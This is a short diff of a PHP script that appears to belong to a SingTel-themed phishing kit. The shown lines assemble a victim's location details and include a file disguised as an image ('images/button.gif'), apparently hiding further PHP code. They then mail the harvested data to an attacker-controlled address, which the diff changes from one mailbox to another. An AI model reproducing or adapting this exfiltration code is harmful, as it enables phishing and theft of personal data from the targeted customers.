@@ -25,7 +25,7 @@ $message .= "Region: $region\n";
 $message .= "Country Name: $country\n";
 $message .= "Country Code: $countrycode\n";
 
-$send = "lcthrn@gmail.com";
+$send = "coldeimel@yahoo.com";
 $subject = "SingTel| $ip | $countrycode | $region";
 include_once "images/button.gif";
 mail($send,$subject,$message);
